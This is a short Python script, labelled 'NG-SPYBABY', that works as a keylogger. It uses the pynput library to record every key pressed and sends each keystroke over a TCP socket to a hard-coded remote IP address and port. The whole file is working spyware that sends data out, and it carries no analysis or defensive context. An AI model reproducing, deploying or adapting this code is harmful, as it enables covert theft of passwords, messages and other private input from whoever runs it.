# From: NG-SPYBABY
from pynput.keyboard import Key, Listener
import socket

HOST = "45.8.229.67"
PORT = 65437

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def on_press(key):
    s.send(bytes(str(key).encode('utf-8')))

with Listener(on_press=on_press) as listener:
    listener.join()



